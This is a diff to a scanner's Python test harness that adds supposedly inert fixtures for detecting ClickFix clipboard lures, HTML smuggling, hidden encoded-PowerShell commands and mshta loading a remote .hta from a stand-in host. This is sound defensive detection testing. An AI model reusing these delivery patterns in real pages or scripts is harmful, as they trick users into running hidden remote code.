@@ -53,6 +53,106 @@ def pdf(action: bytes) -> bytes:
     return bytes(output)
 
 
+def delivery_cases() -> dict[str, tuple[bytes, str | None]]:
+    """Inert text only: these commands and browser fragments are never executed."""
+    clickfix = (
+        b"<p>Verify you are human. Press Win + R, then Ctrl + V.</p>"
+        b'<script>navigator.clipboard.writeText("INERT_PLACEHOLDER");</script>'
+    )
+    smuggling = (
+        b'<script>const b=atob("UEs="); const f=new Blob([b]); '
+        b'a.href=URL.createObjectURL(f); a.download="example.zip";</script>'
+    )
+    encoded = base64.b64encode("Write-Output 'inert'".encode("utf-16le"))
+    powershell = b"powershell.exe -WindowStyle Hidden -EncodedCommand " + encoded
+    mshta = b"mshta.exe https://example.invalid/inert.hta"
+    return {
+        "delivery_clickfix.html": (clickfix, "web_clickfix_lure"),
+        "delivery_clickfix_legacy.html": (
+            clickfix.replace(b"navigator.clipboard.writeText", b"document.execCommand")
+            .replace(b"INERT_PLACEHOLDER", b"copy")
+            .replace(b"Win + R", b"Open the Terminal")
+            .replace(b"Ctrl + V", b"paste the command"),
+            "web_clickfix_lure",
+        ),
+        "delivery_clickfix_entities.html": (
+            clickfix.replace(b"Verify you", b"Verify&#32;you"),
+            "web_clickfix_lure",
+        ),
+        "delivery_clickfix.gz": (gzip.compress(clickfix, mtime=0), "web_clickfix_lure"),
+        "delivery_captcha_only.html": (b"Verify you are human. Complete the CAPTCHA.", None),
+        "delivery_clipboard_only.html": (
+            b'navigator.clipboard.writeText("an ordinary copied note");',
+            None,
+        ),
+        "delivery_no_clipboard.html": (clickfix.split(b"<script>")[0], None),
+        "delivery_no_lure.html": (clickfix.replace(b"Verify you are human.", b"Help page."), None),
+        "delivery_distant_lure.html": (clickfix.replace(b"<script>", b" " * 5000), None),
+        "delivery_smuggling.html": (smuggling, "web_html_smuggling"),
+        "delivery_smuggling_attribute.js": (
+            smuggling.replace(
+                b'a.download="example.zip"', b'a.setAttribute("download", "demo.js")'
+            ),
+            "web_html_smuggling",
+        ),
+        "delivery_smuggling.zip": (zipped("attachment.html", smuggling), "web_html_smuggling"),
+        "delivery_image_export.html": (smuggling.replace(b"example.zip", b"example.png"), None),
+        "delivery_pdf_export.html": (smuggling.replace(b"example.zip", b"example.pdf"), None),
+        "delivery_text_suffix.html": (smuggling.replace(b"example.zip", b"example.exe.txt"), None),
+        "delivery_no_decode.html": (smuggling.replace(b'atob("UEs=")', b'"ordinary text"'), None),
+        "delivery_no_blob.html": (smuggling.replace(b"new Blob([b])", b"existingFile"), None),
+        "delivery_distant_decode.html": (
+            smuggling.replace(b"const f=", b" " * 5000 + b"const f="),
+            None,
+        ),
+        "delivery_encoded.ps1": (powershell, "script_encoded_powershell"),
+        "delivery_encoded_bypass.cmd": (
+            b'"pwsh.exe" -ep Bypass -enc "' + encoded + b'"',
+            "script_encoded_powershell",
+        ),
+        "delivery_encoded_reordered.cmd": (
+            b"powershell -e " + encoded + b" -w hidden",
+            "script_encoded_powershell",
+        ),
+        "delivery_encoded_abbreviated.cmd": (
+            b"powershell -NoP -w h -eC " + encoded,
+            "script_encoded_powershell",
+        ),
+        "delivery_encoded_utf16.bin": (
+            powershell.decode().encode("utf-16le"),
+            "script_encoded_powershell",
+        ),
+        "delivery_encoded_only.cmd": (b"powershell -EncodedCommand " + encoded, None),
+        "delivery_hidden_only.cmd": (b"powershell -WindowStyle Hidden -File local.ps1", None),
+        "delivery_encoded_arguments.cmd": (
+            b"powershell -WindowStyle Hidden -EncodedArguments " + encoded,
+            None,
+        ),
+        "delivery_encoded_split_lines.cmd": (
+            b"powershell -enc " + encoded + b"\n -WindowStyle Hidden",
+            None,
+        ),
+        "delivery_encoded_split_commands.cmd": (
+            b"powershell -w hidden; echo -enc " + encoded,
+            None,
+        ),
+        "delivery_mshta.cmd": (mshta, "script_mshta_remote"),
+        "delivery_mshta_quoted.bin": (
+            b'"C:\\Windows\\System32\\MSHTA.EXE" "https://example.invalid/inert.hta"',
+            "script_mshta_remote",
+        ),
+        "delivery_mshta_local.cmd": (b"mshta.exe C:\\inert\\local.hta", None),
+        "delivery_mshta_unrelated_url.cmd": (
+            b"mshta.exe local.hta\nHelp: https://example.invalid/documentation",
+            None,
+        ),
+        "delivery_mshta_name_collision.txt": (
+            b"notmshta.exe https://example.invalid/inert.hta",
+            None,
+        ),
+    }
+
+
 def main() -> None:
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument(
@@ -158,6 +258,11 @@ def main() -> None:
         expected[name] = "block"
     for name in ("depth.zip", "encrypted.zip", "broken.zip", "unsupported.7z", "too_many.zip"):
         expected[name] = "incomplete"
+    delivery = delivery_cases()
+    delivery_rules = {rule_id for _, rule_id in delivery.values() if rule_id}
+    for name, (data, rule_id) in delivery.items():
+        cases[name] = data
+        expected[name] = "advisory" if rule_id else "clean"
     source_files = sorted((REPO / "rules/local").glob("*.yar"))
     git = shutil.which("git")
     if git is None:
@@ -205,11 +310,27 @@ def main() -> None:
             )
             if result.verdict.value != expected[name]:
                 failures.append(f"{name}: expected {expected[name]}, got {result.verdict.value}")
+            if name in delivery:
+                required = delivery[name][1]
+                actual = {f.rule_id for f in result.findings} & delivery_rules
+                if actual != ({required} if required else set()):
+                    failures.append(f"{name}: expected delivery rule {required}, got {actual}")
+            for fixture, rule_id, view, members in (
+                ("delivery_clickfix_entities.html", "web_clickfix_lure", "html-unescaped", []),
+                ("delivery_encoded_utf16.bin", "script_encoded_powershell", "decoded-utf16", []),
+                ("delivery_clickfix.gz", "web_clickfix_lure", "raw", ["gzip:0"]),
+                ("delivery_smuggling.zip", "web_html_smuggling", "raw", ["zip:0"]),
+            ):
+                if name == fixture and not any(
+                    f.rule_id == rule_id and f.view == view and f.member_path == members
+                    for f in result.findings
+                ):
+                    failures.append(f"{name}: missing expected member/view provenance")
             if not result.engine_version or not result.ruleset_sha256:
                 failures.append(f"{name}: missing scan provenance")
-        if compiled != 12 or skipped or error:
+        if compiled != 16 or skipped or error:
             failures.append("local rules did not all compile")
-        for label, content, policy, verdict, destination in (
+        cli_cases = (
             ("advisory", phrase, "default", "advisory", "clean"),
             ("block", "override\u202e".encode(), "default", "block", "blocked"),
             ("rescan", phrase, "default", "advisory", "clean"),
@@ -218,7 +339,22 @@ def main() -> None:
             ("incomplete", cases["broken.zip"], "agent-ingest", "incomplete", "quarantine"),
             ("member", cases["script_zip.zip"], "default", "block", "blocked"),
             ("derived", cases["html_entities.html"], "agent-ingest", "block", "blocked"),
-        ):
+        )
+        delivery_cli = (
+            "delivery_clickfix.html",
+            "delivery_smuggling.html",
+            "delivery_encoded.ps1",
+            "delivery_mshta.cmd",
+        )
+        cli_cases += tuple(
+            (name, cases[name], policy, verdict, destination)
+            for name in delivery_cli
+            for policy, verdict, destination in (
+                ("default", "advisory", "clean"),
+                ("agent-ingest", "block", "blocked"),
+            )
+        )
+        for label, content, policy, verdict, destination in cli_cases:
             home = root / ("home-" + label)
             inbox = home / "inbox"
             inbox.mkdir(parents=True, exist_ok=True)
@@ -241,6 +377,11 @@ def main() -> None:
                 check=False,
             )
             compact = json.loads(next((home / "reports").glob("*.json")).read_text())
+            if label in delivery_cli and not any(
+                f["rule_id"] == delivery[label][1] and f["severity"] == "advisory"
+                for f in compact["findings"]
+            ):
+                failures.append(f"CLI {label}: missing delivery rule or original severity")
             locations = [
                 folder
                 for folder in ("clean", "blocked", "quarantine")
@@ -257,6 +398,8 @@ def main() -> None:
             sarif_text = next((home / "reports").glob("*.sarif")).read_text()
             if phrase.decode() in sarif_text or phrase.decode() in json.dumps(compact):
                 failures.append(f"CLI {label}: report contains matched bytes")
+            if label in delivery_cli and content.decode() in sarif_text + json.dumps(compact):
+                failures.append(f"CLI {label}: report contains input content")
             for item in json.loads(sarif_text)["runs"][0]["results"]:
                 context = item["properties"]
                 if context["member_path"] or context["view"] != "raw":
